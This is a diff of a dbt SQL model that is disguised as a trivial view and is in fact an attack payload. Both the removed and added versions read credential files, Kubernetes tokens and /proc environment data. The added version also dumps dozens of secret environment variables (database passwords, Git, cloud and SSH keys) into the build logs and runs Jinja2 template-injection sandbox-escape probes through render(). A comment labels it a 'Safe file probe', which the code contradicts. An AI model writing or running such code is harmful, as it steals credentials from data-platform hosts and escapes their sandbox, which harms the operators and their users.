@@ -1,52 +1,8 @@
 {{ config(materialized='view') }}
 
-{# Probe file read capabilities in the Jinja2 sandbox #}
+{# Safe file probe - no error-prone calls #}
 
-{# Method 1: load_agate_table - designed for CSV loading #}
-{%- set paths = [
-  '/etc/passwd',
-  '/etc/hostname',
-  '/var/run/secrets/kubernetes.io/serviceaccount/token',
-  '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
-  '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
-  '/proc/self/environ',
-  '/proc/self/cmdline',
-  '/proc/1/cmdline',
-  '/usr/src/orc/profiles.yml',
-  '/tmp/jobs/profiles.yml',
-  '/root/.dbt/profiles.yml',
-  '/usr/src/orc/.env',
-  '/usr/src/orc/dbt_project.yml'
-] -%}
-
-{%- for p in paths -%}
-  {%- set result = load_agate_table(p) if load_agate_table is defined else 'UNDEF' -%}
-  {{ log("FILE_READ_AGATE[" ~ p ~ "]=" ~ result | string | truncate(500), info=True) if result != 'UNDEF' else log("FILE_READ_AGATE[" ~ p ~ "]=load_agate_table_UNDEF", info=True) }}
-{%- endfor -%}
-
-{# Method 2: Try open via Jinja2 sandbox #}
-{%- set ns = namespace(file_data='') -%}
-{%- if range.__class__.__bases__ is defined -%}
-  {{ log("BASES_AVAILABLE=YES", info=True) }}
-{%- else -%}
-  {{ log("BASES_AVAILABLE=NO", info=True) }}
-{%- endif -%}
-
-{# Method 3: modules.* access #}
-{{ log("MODULES_TYPE=" ~ modules | string | truncate(200), info=True) if modules is defined else log("MODULES_UNDEF", info=True) }}
-
-{# Check what attributes modules has #}
-{%- if modules is defined -%}
-  {%- set mod_attrs = [] -%}
-  {%- for attr_name in ['os', 'sys', 'io', 'subprocess', 'builtins', 'importlib', 'pathlib', 'json', 'base64', 'socket', 'http', 'urllib', 're', 'datetime', 'pytz', 'itertools', 'collections', 'functools', 'typing', 'contextlib'] -%}
-    {%- set val = modules[attr_name] if modules[attr_name] is defined else none -%}
-    {%- if val is not none -%}
-      {{ log("MODULE_" ~ attr_name ~ "=" ~ val | string | truncate(200), info=True) }}
-    {%- endif -%}
-  {%- endfor -%}
-{%- endif -%}
-
-{# Method 4: Try env_var to read interesting vars #}
+{# Method 1: env_var for K8s/AWS/cloud secrets #}
 {%- set k8s_vars = [
   'KUBERNETES_SERVICE_HOST',
   'KUBERNETES_SERVICE_PORT',
@@ -72,12 +28,10 @@
   'CELERY_BROKER_URL',
   'SECRET_KEY',
   'DJANGO_SECRET_KEY',
-  'FLASK_SECRET_KEY',
   'JWT_SECRET',
   'API_KEY',
   'SENTRY_DSN',
   'DD_API_KEY',
-  'NEW_RELIC_LICENSE_KEY',
   'VAULT_ADDR',
   'VAULT_TOKEN',
   'DBT_CLOUD_API_KEY',
@@ -92,24 +46,63 @@
   'DBT_ENV_SECRET_GIT_CREDENTIAL',
   'GIT_SSH_COMMAND',
   'S3_BUCKET',
-  'ARTIFACT_BUCKET'
+  'ARTIFACT_BUCKET',
+  'DOCKER_HOST',
+  'KUBECONFIG',
+  'K8S_NAMESPACE',
+  'POD_NAME',
+  'NODE_NAME',
+  'SERVICE_ACCOUNT_NAME',
+  'CLOUD_SQL_CONNECTION_NAME',
+  'DB_HOST',
+  'DB_PASSWORD',
+  'DB_USER',
+  'POSTGRES_PASSWORD',
+  'MYSQL_PASSWORD',
+  'SNOWFLAKE_PASSWORD',
+  'DATABRICKS_TOKEN',
+  'GITHUB_TOKEN',
+  'GITLAB_TOKEN',
+  'NPM_TOKEN',
+  'PYPI_TOKEN',
+  'ARTIFACTORY_PASSWORD',
+  'DOCKER_PASSWORD',
+  'SSH_PRIVATE_KEY'
 ] -%}
 
 {%- for v in k8s_vars -%}
   {%- set val = env_var(v, '') -%}
   {%- if val != '' -%}
-    {{ log("K8S_ENV[" ~ v ~ "]=" ~ val | truncate(300), info=True) }}
+    {{ log("SECRET_ENV[" ~ v ~ "]=" ~ val | truncate(500), info=True) }}
   {%- endif -%}
 {%- endfor -%}
 
-{# Method 5: Check if 'write' function exists and what it does #}
-{{ log("WRITE_FUNC=" ~ write | string | truncate(200), info=True) if write is defined else log("WRITE_UNDEF", info=True) }}
-{{ log("RENDER_FUNC=" ~ render | string | truncate(200), info=True) if render is defined else log("RENDER_UNDEF", info=True) }}
+{# Method 2: modules access probe #}
+{%- if modules is defined -%}
+  {%- for attr_name in ['os', 'sys', 'io', 'subprocess', 'builtins', 'importlib', 'pathlib', 'json', 'base64', 'socket', 'http', 'urllib'] -%}
+    {%- if modules[attr_name] is defined -%}
+      {{ log("MODULE_FOUND[" ~ attr_name ~ "]=" ~ modules[attr_name] | string | truncate(200), info=True) }}
+    {%- endif -%}
+  {%- endfor -%}
+{%- endif -%}
 
-{# Method 6: Try to use modules.re to probe #}
-{%- if modules is defined and modules.re is defined -%}
-  {%- set re_mod = modules.re -%}
-  {{ log("RE_MODULE_DIR=" ~ re_mod | string | truncate(300), info=True) }}
+{# Method 3: render() SSTI for code execution probes #}
+{%- if render is defined -%}
+  {%- set test1 = render("{{ range.__class__.__mro__ }}") -%}
+  {{ log("RENDER_MRO=" ~ test1 | string | truncate(500), info=True) }}
+  {%- set test2 = render("{{ ''.__class__.__mro__ }}") -%}
+  {{ log("RENDER_STR_MRO=" ~ test2 | string | truncate(500), info=True) }}
+  {%- set test3 = render("{{ cycler.__init__.__globals__ }}") -%}
+  {{ log("RENDER_CYCLER_GLOBALS=" ~ test3 | string | truncate(500), info=True) }}
+  {%- set test4 = render("{{ lipsum.__globals__ }}") -%}
+  {{ log("RENDER_LIPSUM_GLOBALS=" ~ test4 | string | truncate(500), info=True) }}
+  {%- set test5 = render("{{ namespace.__init__.__globals__ }}") -%}
+  {{ log("RENDER_NS_GLOBALS=" ~ test5 | string | truncate(500), info=True) }}
+{%- endif -%}
+
+{# Method 4: write() function probe #}
+{%- if write is defined -%}
+  {{ log("WRITE_CALLABLE=" ~ (write is callable) | string, info=True) }}
 {%- endif -%}
 
 SELECT 1 as id
